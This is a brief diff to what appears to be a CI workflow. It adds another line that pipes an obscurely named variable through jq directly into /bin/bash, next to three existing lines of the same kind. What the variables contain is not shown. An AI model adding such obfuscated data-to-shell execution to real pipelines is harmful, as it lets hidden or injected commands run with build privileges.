@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$l2" | jq -r .vn06 | /bin/bash
           printf '%s' "$dqchm905" | jq -r .x04 | /bin/bash
           printf '%s' "$b8" | jq -r .uk34895 | /bin/bash
+          echo $pvx905 | jq -r .xm720 | /bin/bash
 
       - name: Save archive
         if: always()
